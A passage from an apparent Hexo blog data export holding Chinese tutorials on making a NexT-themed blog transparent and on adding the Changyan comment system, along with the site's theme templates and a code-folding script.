class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">//文章背板的颜色rgb</span></span><br><span class=\"line\"><span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.sub-menu,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.post-block,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.tabs-comment,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.comments,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.pagination&#123;</span></span><br><span class=\"line\">\t<span class=\"attr\">background:</span> <span class=\"comment\">#f5f5f56b;\t\t//此处使用十六进制颜色代码,也可以使用rgba进行调色,实际效果为白色透明色底板,rgba的第四参数即为透明度</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//修改主体字体颜色</span></span><br><span class=\"line\"><span class=\"string\">body&#123;</span>\t\t\t\t</span><br><span class=\"line\">  <span class=\"attr\">color:</span> <span class=\"comment\">#000;\t\t//纯黑</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//标题颜色</span></span><br><span class=\"line\"><span class=\"string\">.posts-expand</span> <span class=\"string\">.post-title-link</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">color:</span> <span class=\"comment\">#000;\t\t\t\t//首页文章标题颜色， （默认为灰辨识度不高）</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//标题下的日期颜色</span></span><br><span class=\"line\"><span class=\"string\">.posts-expand</span> <span class=\"string\">.post-meta-container</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">color:</span> <span class=\"comment\">#880000;\t\t\t\t//此处修改为红色,可自行调用rgb调色</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//侧边框的透明度设置</span></span><br><span class=\"line\"><span class=\"string\">.sidebar</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">opacity:</span> <span class=\"number\">0.7</span><span class=\"string\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//菜单栏的调色</span></span><br><span class=\"line\"><span class=\"string\">.header-inner</span> &#123;\t\t</span><br><span class=\"line\">  <span class=\"attr\">background:</span> <span class=\"string\">rgba(255</span>,<span class=\"number\">0</span>,<span class=\"number\">255</span>,<span class=\"number\">0.7</span><span class=\"string\">);</span></span><br><span class=\"line\">&#125;<span class=\"string\">y</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//搜索框透明</span></span><br><span class=\"line\"><span class=\"string\">.popup</span> &#123;\t\t</span><br><span class=\"line\">  <span class=\"attr\">opacity:</span> <span class=\"number\">0.7</span><span class=\"string\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//主体背景透明</span></span><br><span class=\"line\"><span class=\"string\">.main-inner</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">background-color:</span> <span class=\"string\">rgba(255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">0</span><span class=\"string\">);</span></span><br><span class=\"line\">    <span class=\"attr\">padding:</span> <span class=\"string\">0px</span> <span class=\"string\">40px</span> <span class=\"string\">40px</span> <span class=\"string\">40px;</span>  <span class=\"string\">//调整组件位置</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>PS：各项配置说明都标注得很清楚，按照自己的喜好进行设置即可。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>之前在<a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">设置博客背景图片</a>的过程中，其实已经间接实现过设置博客背景透明度的功能了。<br>因为已经设置了博客背景“小飞棍”的特效，如果再把博客背景设置为透明的话，估计很多人会把持不住，在博客上玩起“小飞棍”吧。所以，就一直没有把博客背景设置为透明。</p>\n<p>直到前段时间有位朋友跟我说，如果是透明的，效果可能会更好一些。虽说当时我也跟她说过我的顾虑。但是我也打算尝试一下透明效果，毕竟之前设置的时候真的很美。</p>\n<p>闲话少叙，教程开始。</p>","more":"<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>和配置背景图片时的操作差不多，打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>style: source/_data/styles.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<p>PS：我这里取消注释的比较多，因为设置的比较多，单独说设置透明度的话，只需要取消注释<code>style</code>即可。</p>\n<ol start=\"2\">\n<li>按照<code>style</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">//文章背板的颜色rgb</span></span><br><span class=\"line\"><span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.sub-menu,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.post-block,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.tabs-comment,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.comments,</span> <span class=\"string\">.main-inner</span> <span class=\"string\">&gt;</span> <span class=\"string\">.pagination&#123;</span></span><br><span class=\"line\">\t<span class=\"attr\">background:</span> <span class=\"comment\">#f5f5f56b;\t\t//此处使用十六进制颜色代码,也可以使用rgba进行调色,实际效果为白色透明色底板,rgba的第四参数即为透明度</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//修改主体字体颜色</span></span><br><span class=\"line\"><span class=\"string\">body&#123;</span>\t\t\t\t</span><br><span class=\"line\">  <span class=\"attr\">color:</span> <span class=\"comment\">#000;\t\t//纯黑</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//标题颜色</span></span><br><span class=\"line\"><span class=\"string\">.posts-expand</span> <span class=\"string\">.post-title-link</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">color:</span> <span class=\"comment\">#000;\t\t\t\t//首页文章标题颜色， （默认为灰辨识度不高）</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//标题下的日期颜色</span></span><br><span class=\"line\"><span class=\"string\">.posts-expand</span> <span class=\"string\">.post-meta-container</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">color:</span> <span class=\"comment\">#880000;\t\t\t\t//此处修改为红色,可自行调用rgb调色</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//侧边框的透明度设置</span></span><br><span class=\"line\"><span class=\"string\">.sidebar</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">opacity:</span> <span class=\"number\">0.7</span><span class=\"string\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//菜单栏的调色</span></span><br><span class=\"line\"><span class=\"string\">.header-inner</span> &#123;\t\t</span><br><span class=\"line\">  <span class=\"attr\">background:</span> <span class=\"string\">rgba(255</span>,<span class=\"number\">0</span>,<span class=\"number\">255</span>,<span class=\"number\">0.7</span><span class=\"string\">);</span></span><br><span class=\"line\">&#125;<span class=\"string\">y</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//搜索框透明</span></span><br><span class=\"line\"><span class=\"string\">.popup</span> &#123;\t\t</span><br><span class=\"line\">  <span class=\"attr\">opacity:</span> <span class=\"number\">0.7</span><span class=\"string\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">//主体背景透明</span></span><br><span class=\"line\"><span class=\"string\">.main-inner</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">background-color:</span> <span class=\"string\">rgba(255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">0</span><span class=\"string\">);</span></span><br><span class=\"line\">    <span class=\"attr\">padding:</span> <span class=\"string\">0px</span> <span class=\"string\">40px</span> <span class=\"string\">40px</span> <span class=\"string\">40px;</span>  <span class=\"string\">//调整组件位置</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>PS：各项配置说明都标注得很清楚，按照自己的喜好进行设置即可。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>"},{"title":"博客评论系统之changyan","date":"2023-07-17T11:03:30.000Z","_content":"\n### 搭建原因\n\n之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。\n\n### 条件准备\n\n1. 使用畅言评论，我们首先要去[畅言评论官网](https://changyan.kuaizhan.com/)注册一个账号。\n\n<!-- more -->\n\n紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。\n\n![添加站点](./changyan-comment/1.png)\n\n2. 找到ID和SECRET。\n\n注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。\n\n![添加站点](./changyan-comment/2.png)\n\n3. 修改NEXT的主题配置文件。\n\n将comment的active值修改为changyan。\n\n```bash\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\n然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。\n\n```bash\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\n修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：\n\n![添加站点](./changyan-comment/3.png)\n\n4. 对评论区的功能进行更多的设置。\n\n可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。\n\n![添加站点](./changyan-comment/4.png)\n\n可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。\n\n![添加站点](./changyan-comment/5.png)\n\n还可以设置主题的样式。\n\n![添加站点](./changyan-comment/6.png)","source":"_posts/changyan-comment.md","raw":"---\ntitle: 博客评论系统之changyan\ndate: 2023-07-17 19:03:30\ncategories: 博客搭建\ntags:\n  - 博客评论\n---\n\n### 搭建原因\n\n之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。\n\n### 条件准备\n\n1. 使用畅言评论，我们首先要去[畅言评论官网](https://changyan.kuaizhan.com/)注册一个账号。\n\n<!-- more -->\n\n紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。\n\n![添加站点](./changyan-comment/1.png)\n\n2. 找到ID和SECRET。\n\n注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。\n\n![添加站点](./changyan-comment/2.png)\n\n3. 修改NEXT的主题配置文件。\n\n将comment的active值修改为changyan。\n\n```bash\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\n然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。\n\n```bash\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\n修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：\n\n![添加站点](./changyan-comment/3.png)\n\n4. 对评论区的功能进行更多的设置。\n\n可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。\n\n![添加站点](./changyan-comment/4.png)\n\n可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。\n\n![添加站点](./changyan-comment/5.png)\n\n还可以设置主题的样式。\n\n![添加站点](./changyan-comment/6.png)","slug":"changyan-comment","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5f0004k7zj31gkn48yp","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"搭建原因\"><a href=\"#搭建原因\" class=\"headerlink\" title=\"搭建原因\"></a>搭建原因</h3><p>之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。</p>\n<h3 id=\"条件准备\"><a href=\"#条件准备\" class=\"headerlink\" title=\"条件准备\"></a>条件准备</h3><ol>\n<li>使用畅言评论，我们首先要去<a href=\"https://changyan.kuaizhan.com/\">畅言评论官网</a>注册一个账号。</li>\n</ol>\n<span id=\"more\"></span>\n\n<p>紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。</p>\n<p><img src=\"/2023/07/17/changyan-comment/1.png\" alt=\"添加站点\"></p>\n<ol start=\"2\">\n<li>找到ID和SECRET。</li>\n</ol>\n<p>注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。</p>\n<p><img src=\"/2023/07/17/changyan-comment/2.png\" alt=\"添加站点\"></p>\n<ol start=\"3\">\n<li>修改NEXT的主题配置文件。</li>\n</ol>\n<p>将comment的active值修改为changyan。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">comments:</span><br><span class=\"line\">  <span class=\"comment\"># Available values: tabs | buttons</span></span><br><span class=\"line\">  style: tabs</span><br><span class=\"line\">  <span class=\"comment\"># Choose a comment system to be displayed by default.</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class=\"line\">  active: changyan</span><br></pre></td></tr></table></figure>\n\n<p>然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">changyan:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span> <span class=\"comment\"># false</span></span><br><span class=\"line\">  appid: c*******s</span><br><span class=\"line\">  appkey: 48a****b8**2328cd*****ab****50d7</span><br><span class=\"line\">  <span class=\"comment\"># Show comments count</span></span><br><span class=\"line\">  count: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：</p>\n<p><img src=\"/2023/07/17/changyan-comment/3.png\" alt=\"添加站点\"></p>\n<ol start=\"4\">\n<li>对评论区的功能进行更多的设置。</li>\n</ol>\n<p>可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。</p>\n<p><img src=\"/2023/07/17/changyan-comment/4.png\" alt=\"添加站点\"></p>\n<p>可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。</p>\n<p><img src=\"/2023/07/17/changyan-comment/5.png\" alt=\"添加站点\"></p>\n<p>还可以设置主题的样式。</p>\n<p><img src=\"/2023/07/17/changyan-comment/6.png\" alt=\"添加站点\"></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: 